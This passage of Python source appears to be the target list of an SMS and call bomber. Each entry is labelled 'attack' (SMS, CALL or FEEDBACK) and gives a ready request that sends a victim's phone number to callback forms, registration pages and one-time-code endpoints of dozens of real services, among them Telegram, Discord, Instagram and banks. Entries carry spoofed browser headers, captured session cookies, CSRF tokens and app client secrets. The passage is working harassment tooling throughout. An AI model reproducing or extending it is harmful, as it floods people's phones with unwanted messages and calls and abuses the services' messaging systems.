            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://healthyfood.uz', 'Referer': 'https://healthyfood.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'formservices[]': ['06224cf9ec894d95c36698b7d063f2c2', 'caf106af8edeb6ed0b9a251100e382ea', 'd39801d52721fade3c7f42fe21576d0e', 'f69a27c1e3a5ac35bd8d037d5b5e7adf', '8d28672b9ac2fd052b500f2c8e4df893',], 'tildaspec-formname': 'Main', 'Name': 'INSIDE', 'tildaspec-phone-part[]-iso': '+998', 'tildaspec-phone-part[]': f'{str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'Phone': f'+998 {str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'form-spec-comments': '', 'tildaspec-cookie': '_gcl_au=1.1.2120582503.1688101877; _ym_uid=1688101879350809275; _ym_d=1688101879; _ym_isad=1; _fbp=fb.1.1688101878630.225802758; _ym_visorc=w; _ga=GA1.2.2113650197.1688101879; _gid=GA1.2.1119073413.1688101879', 'tildaspec-referer': 'https://healthyfood.uz/', 'tildaspec-formid': 'form465665577', 'tildaspec-formskey': '85527f7d1e3b24e50536b75c0fe30854', 'tildaspec-version-lib': '02.001', 'tildaspec-pageid': '11258131', 'tildaspec-projectid': '927135', 'tildaspec-lang': 'RU', 'tildaspec-fp': '6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773130313368383338',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'UluqiPlastics.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://uluqiplastics.com/index.php',
            'cookies': {'language': 'ru', 'PHPSESSID': '187d97456d2232035893a03fb8eaee0a', 'pll_language': 'ru', '_ym_uid': '1688102501772553128', '_ym_d': '1688102501', '_ym_isad': '1',},
            'headers': {'authority': 'uluqiplastics.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://uluqiplastics.com', 'referer': 'https://uluqiplastics.com/thankyou.html', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'name': 'INSIDE', 'tel': number,},
            'params': {'do': 'ariza',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'ICD.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://icd.uz/ajax/form.php',
            'cookies': {'PHPSESSID': 'KR21X5IH1BxAkNfgezcXza2FdibrEEcB', 'BITRIX_SM_SALE_UID': 'fd3874424d6f32aa85b0773fd391f56b', '_ga': 'GA1.1.1634295603.1688102950', '_ga_8MMW2BZT9V': 'GS1.1.1688102949.1.0.1688102949.0.0.0', '_ym_debug': 'null', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1688158740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', '_ym_uid': '1688102957443142323', '_ym_d': '1688102957', '_ym_isad': '1', 'BX_USER_ID': 'a5d0579c2765e4cd26fe385f2f807f79',},
            'headers': {'authority': 'icd.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryO7KAtd9BhXgQE1FW', 'origin': 'https://icd.uz', 'referer': 'https://icd.uz/basket/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'iframe', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="bxajaxid"\r\n\r\n94975cb2a950ea28e70943222dc0d3d4\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="AJAX_CALL"\r\n\r\nY\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="sessid"\r\n\r\ne79c5e1dc9236032db7382b53eb89818\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="WEB_FORM_ID"\r\n\r\n6\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="sessid"\r\n\r\ne79c5e1dc9236032db7382b53eb89818\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="form_text_27"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="form_text_28"\r\n\r\n+998 ({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW\r\nContent-Disposition: form-data; name="web_form_submit"\r\n\r\nОтправить\r\n------WebKitFormBoundaryO7KAtd9BhXgQE1FW--\r\n'.encode(),
            'params': {'form_id': 'CALLBACK',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Itmir.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://itmir.uz/index.php?route=extension/module/callback',
            'cookies': {'OCSESSID': '975a16de639f52d3744aeaa4f3', 'language': 'ru-ru', 'currency': 'UZS', '_ga': 'GA1.1.1118677656.1688102948', 'poptin_old_user': 'true', 'poptin_user_id': '0.2ec4eymr065', '_ym_uid': '168810294893044584', '_ym_d': '1688102948', '_ym_isad': '1', 'poptin_user_ip': '146.158.28.24', 'poptin_session': 'true', 'poptin_c_visitor': 'true', '_ym_visorc': 'w', 'poptin_referrer': '', '_ga_XSR0HB4BCS': 'GS1.1.1688102947.1.1.1688103426.46.0.0',},
            'headers':  {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://itmir.uz', 'Referer': 'https://itmir.uz/cart', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'name': 'INSIDE', 'phone': number, 'comment': 'INSIDE', 'action': 'send',},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'TMN-Parking.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tmn-parking.ru/api/auth/registration-v2',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://tmn-parking.ru', 'Referer': 'https://tmn-parking.ru/registration', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'email': email(), 'pass': 'aTn-98a-4P6-kJ5', 'phone': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Sputnik24.tv', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sputnik24.tv/register',
            'cookies': {'_ym_uid': '1687248381269647180', '_ym_d': '1687248381', '_ym_visorc': 'w', '_ym_isad': '1', 'yt147': 'aeDUuH022Sw', 'XSRF-TOKEN': 'eyJpdiI6ImpXbjV5dE9HME1oSVhtMWlBRXEzTHc9PSIsInZhbHVlIjoiRE1RRlRoc0svRVdMZ1RGdWJHSGh4cUU1b2p3WjZHOVFsN2JSSUhBMzBJSE5YMCtadkxLYU56VUg1WWorNnJpeDRsLzJoQmZJczRlM1lZY1lOajZwQnhRWGwrK1QzQ0JDYjhnQjRCOXZtQU1RbGxzZzVXdWVac3hwZVVMUnRvcFMiLCJtYWMiOiJmMDNkMDUxYWIxMjgyZjQ3NzUzNTQ1OGYzYzJiODlkOGY5YTEyMWM1YzI4YWE2NzY0ZTdlNDFlN2VlN2QyYzk0IiwidGFnIjoiIn0%3D', 'sputnik24_session': 'eyJpdiI6ImN0TytqWjBRb2drVkdLRVdXRmdpL3c9PSIsInZhbHVlIjoiY1ZlTWw3Y1QwRjllN1RIYmJaRmdEaUtGalkvZTdBRGZxYU8vV1JvVUpFaVFwWFZ5VDhLWEZudnY1WlZCemJpRGZ0NFdubmJGd0Q4TCtGMVR0cDEzWVBpSkVMdXMxdWhtV2l2MUxQb1hhb0ZMVVJxR0Nic1NUM2l5YlhVNlhJeSsiLCJtYWMiOiJiMTNhYjJmMGY2YTllMWIyNTg1MmVmMGRhMDU5ZWJhOGNmOTFkMjE5ODEyYjA4MTFjODc1MmQ3ZDc1MjAzY2FlIiwidGFnIjoiIn0%3D', 'xb8rqEA2ebaSiLeG4CEEagYH0wjp8CFVYTnE4rM5': 'eyJpdiI6InFhN01nYXIvSjZqcmE3dnNsRWVuR3c9PSIsInZhbHVlIjoiQXMraUpYakUrVG9zaXVjMVBMRWV2RC9RS3huV2RKZFQyWHc2d3VPMUNXM0loaHFOc3l0NFRjK0xuYkF0VnZjbE51WXZvbXJjMTh4S3RrQ1NvdjB1NXNva3NHVzdDbXNGVE10ajZ1YUdQZWl4UEVuRVFCMXorRExHanhxV3lvRmxjWjVCcS92TVBmTTJUaTRKcTlORXZCc0pGV3ljdC9qcjhGWWxkbXE1aE9HdXhSQ2tkdHFPcEZyL3NyU1hPdWxkR0J4RUlTWk0rYnBuY0puYVJJaVJ3c29LN05QVkMvV3lBQ2JCREozTmtQbHRSUUZpSGFVYjhiUlRidXI3WTVPQklXUWlIVWpKanJnbFpwbWU5SzBobkFYR2h0bGhTNm5XZHBnM0N4ODJzeHREUllHTzRXQTVHa2RMbTlLdlJ5L0pXTzk4T2tkbHBMeUo2SjdEQ3pDZWhzZ1RWRTdSUFcrNnJadW9mSGRpczk5VEV1Z0dxc3Rkd2pKNEx5cVM0QlBaeW81eUtXY1RTTDFHNE1hRXlDWlpCZmpUcVJPRGI0M3lYRTMrY2d1cE1USzM5Zlo0MVhLWTBYWm9pVTBkRGVpblV5T29DNktrV0pCcS9yM1d6UUZCWmc9PSIsIm1hYyI6ImU3ZjVhYWFiNzU0OWEzMzgxMjEyYzFjOTU5ZWY1NjA2OGM0YzczOTQzOGZkMzE2OTU2MDk2NGE2ZDY1MThmZjQiLCJ0YWciOiIifQ%3D%3D',},
            'headers': {'authority': 'sputnik24.tv', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://sputnik24.tv', 'referer': 'https://sputnik24.tv/register', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'a7Ipr0ySWCh38u6HyuvwqXC9crwpFoPoj2jiPxzz', 'x-requested-with': 'XMLHttpRequest',},
            'json': {'name': username(), 'email': f'7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'password': 'rfctvgybhunjimko', 'politics': True, 'distribution': True, 'code': '',},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'multiplex.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.multiplex.ua/login',
            'headers': user_agent()[0],
            'data': {'login': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'epicentrk.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/',
            'headers': {'X-Requested-With': 'XMLHttpRequest', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; ...', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F'},
            'data': {'LANG_ID': 'ua', 'USER_LOGIN': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'my.xtra.tv', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.xtra.tv/api/signup?lang=uk',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'bi.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://bi.ua/api/v1/accounts',
            'headers': user_agent()[0],
            'data': {'grand_type': 'sms_code', 'login': 'Сергей', 'phone': number, 'stage': '1'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ctrs.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.ctrs.com.ua/api/auth/login',
            'headers': user_agent()[0],
            'data': {'provider': 'phone', 'identity': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'telegram', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.telegram.org/auth/send_password',
            'headers': user_agent()[0],
            'data': {'phone': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'icq', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://u.icq.net/api/v70/rapi/auth/sendCoden',
            'headers': user_agent()[0],
            'data': {'phone': number, 'devId': 'ic1rtwz1s1Hj1O0r'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'discord', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://discord.com/api/v9/auth/register/phone',
            'headers': user_agent()[0],
            'data': {'phone': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'vodafone', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://registration.vodafone.ua/api/v1/process/smsCode',
            'headers': user_agent()[0],
            'data': {'number': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'megasport', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://megasport.ua/api/auth/phone/?language=ru',
            'headers': user_agent()[0],
            'data': {'phone': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'zolotakoroleva.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://zolotakoroleva.ua/api/send-otp',
            'headers': user_agent()[0],
            'data': {'params': {'phone': f"+{number}"}},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'mozayka.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mozayka.com.ua/!processing/ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': f"+{number}", 'mp_m': 'sendsmscodereg', 'token': '9d064a2beeb932ae5de11f74631269b4'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'kazan-divan.eatery.club', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kazan-divan.eatery.club/site/v1/pre-login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'groshivsim.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://admin1.groshivsim.com/api/sms/phone-verification/create',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'money4you.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://money4you.ua/api/clientRegistration/sendValidationSms',
            'headers': user_agent()[0],
            'data': {'fathersName': 'Витальевич', 'firstName': 'Виталий', 'lastName': 'Соколов', 'phone': f"+{number}", 'udriveEmployee': 'false'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'instagram.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.instagram.com/accounts/account_recovery_send_ajax/',
            'headers': {
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; ...',
                'referer': 'https://www.instagram.com/accounts/password/reset/',
                'origin': 'https://www.instagram.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)',
                'x-csrftoken': 'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL',
                'x-ig-app-id': '936619743392459',
                'x-instagram-ajax': 'a9aec8fa634f',
                'x-requested-with': 'XMLHttpRequest'
            },
            'data': {'email_or_username': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'taximaxim.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send',
            'headers': {'X-Requested-With': 'XMLHttpRequest', 'accept-charset': 'UTF-8', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'Connection': 'keep-alive'},
            'data': {'locale': 'uk', 'phone': number, 'type': 'droppedcall', 'smstoken': 'vEMdSjfFO6R', 'isDefault': '1'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'md-fashion.com.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://md-fashion.com.ua/bpm/validate-contact',
            'headers': user_agent()[0],
            'data': {'phone': f"+{number}"},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'budusushi.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://be.budusushi.ua/login',
            'headers': {'X-Requested-With': 'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; ...'},
            'data': {'LoginForm[username]': str(number)[2:]},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'nl.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.nl.ua/ua/personal/',
            'headers': {
                'X-Requested-With': 'XMLHttpRequest',
                'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf;',
                'referer': 'https://www.nl.ua/ua/personal/',
                'referrer-policy': 'no-referrer-when-downgrade',
                'server': 'nginx/1.20.1',
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                'DNT': '1'
            },
            'data': {'component': 'bxmaker.authuserphone.login', 'method': 'sendCode', 'phone': f'+{number}', 'registration': 'N'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'telemed.care', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.telemed.care/oauth/verify_phone_number',
            'headers': {'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'},
            'data': {'phone_number': f'+{number}'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'topcredit.ua', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://admin.topcredit.ua/api/sms/password-verification/create',
            'headers': {},
            'data': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Qiwi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mobile-api.qiwi.com/oauth/authorize',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': number, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Benzuber', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.benzuber.ru/login',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Cinema5', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cinema5.ru/api/phone_code',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Citilink', 'anonymous': 'No'},
            'method': 'post',
            'url': f'https://www.citilink.ru/registration/confirm/phone/+{number}/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'City24', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://city24.ua/personalaccount/account/registration',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'PhoneNumber': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Cross-Studio', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cross-studio.ru/ajax/lk/send_sms',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'email': email(), 'pass': 'DFD274$11asd', 'pass1': 'DFD274$11asd', 'name': username(), 'fename': username(), 'hash': ''},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Dianet', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.dianet.com.ua/send_sms/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'DNS Shop', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'is_repeat': 0, 'order_guid': 1},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Eldorado', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.eldorado.ua/v1/sign/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'login': number, 'step': 'phone-check', 'fb_id': 'null', 'fb_token': 'null', 'lang': 'ru'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Finam', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.finam.ru/api/smslocker/sendcode',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Dgtl', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://i-dgtl.ru/curl/flashcall.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'check': '', 'flashcall-code': 3253, 'flashcall-tel': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
            'headers': {'Origin': 'https://www.flipkart.com', 'X-user-agent': user_agent()[1]},
            'data': {'loginId': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Foodband', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://foodband.ru/api?call=calls',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'customerName': 'Misha', 'phone': number, 'g-recaptcha-response': ''},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Gazprom', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.gazprombank.ru/rest/sms.send',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'type': 'debit_card'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Getmancar', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://crm.getmancar.com.ua/api/veryfyaccount',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': f'+{number}', 'grant_type': 'password', 'client_id': 'gcarAppMob', 'client_secret': 'SomeRandomCharsAndNumbersMobile'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ginzadelivery', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ginzadelivery.ru/v1/auth',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Grilnica', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://grilnica.ru/loginphone/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'step': 0, 'phone': number, 'code': '', 'allow_sms': 'on', 'apply_offer': 'on'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Gurutaxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://guru.taxi/api/v1/driver/session/verify',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': {'code': 1, 'number': number}},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Hatimaki', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.hatimaki.ru/register/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'REGISTER[LOGIN]': number, 'REGISTER[PERSONAL_PHONE]': number, 'REGISTER[SMS_CODE]': '', 'resend-sms': '1', 'REGISTER[EMAIL]': '', 'register_submit_button': 'Зарегистрироваться'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Helsi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://helsi.me/api/healthy/accounts/login',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'platform': 'PISWeb'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Hmara', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://api.hmara.tv/stable/entrance',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'contact': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ICQ', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'msisdn': number, 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ievaphone', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://ievaphone.com/call-my-phone/web/request-free-call',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'phone': number, 'domain': 'IEVAPHONE', 'browser': 'undefined'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Imgur', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.imgur.com/account/v1/phones/verify',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone_number': number, 'region_code': 'RU'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Indriver', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://terra-1.indriverapp.com/api/authorization?locale=ru',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'mode': 'request', 'phone': number, 'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6', 'osversion': 'unknown', 'devicemodel': 'unknown'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ingos', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
            'headers': {'Referer': 'https://www.ingos.ru/cabinet/registration/personal', 'User-Agent': user_agent()[1], 'DNT': '1'},
